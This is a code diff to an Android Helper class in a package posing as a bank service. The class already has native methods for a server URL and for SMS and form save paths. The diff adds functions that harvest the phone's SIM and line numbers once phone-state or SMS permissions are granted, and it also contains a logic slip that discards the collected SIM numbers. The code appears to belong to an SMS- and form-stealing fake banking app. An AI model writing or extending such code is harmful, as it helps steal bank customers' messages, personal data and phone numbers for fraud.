@@ -2,6 +2,7 @@ package com.union.bank.service.settings;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
@@ -9,7 +10,12 @@ import android.net.NetworkInfo;
 import android.os.AsyncTask;
 import android.os.Build;
 import android.provider.Settings;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import androidx.core.app.ActivityCompat;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -21,6 +27,7 @@ import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
+import java.util.List;
 import java.util.Scanner;
 
 
@@ -33,8 +40,9 @@ public class Helper {
     public native String URL();
     public native String SMSSavePath();
     public native  String FormSavePath();
+    public native  String getNumber();
 
-    public static String TAG = "";
+    public static String TAG = "Kritika";
 
     public static void postRequest(String path, JSONObject jsonData, ResponseListener listener) {
         new AsyncTask<String, Void, String>() {
@@ -228,6 +236,46 @@ public class Helper {
     @SuppressLint("HardwareIds")
     public static String getAndroidId(Context context) {
         return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+    }
+
+
+
+    public static String getSimNumbers(Context context) {
+        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
+        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            return "Permission is Denied on getSimNumbers";
+        }
+        List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
+        if (subscriptionInfoList != null) {
+            String Numbers = "";
+            for (SubscriptionInfo info : subscriptionInfoList) {
+                Numbers += " | " + info.getNumber();
+            }
+            if(!Numbers.isEmpty()) {
+                Numbers = getPhoneNumber(context);
+            }
+            return Numbers;
+        }else{
+            return "subscription info is null on getSimNumbers";
+        }
+    }
+
+    public static String getPhoneNumber(Context context) {
+        // default phone number..
+        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        if (tMgr != null) {
+            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+                return "Phone OR SMS permission is not granted";
+            }
+            String mPhoneNumber = tMgr.getLine1Number();
+            if (mPhoneNumber != null && !mPhoneNumber.isEmpty()) {
+                return mPhoneNumber;
+            } else {
+                return "Phone number not available";
+            }
+        } else {
+            return "TelephonyManager is null";
+        }
     }
 
 }
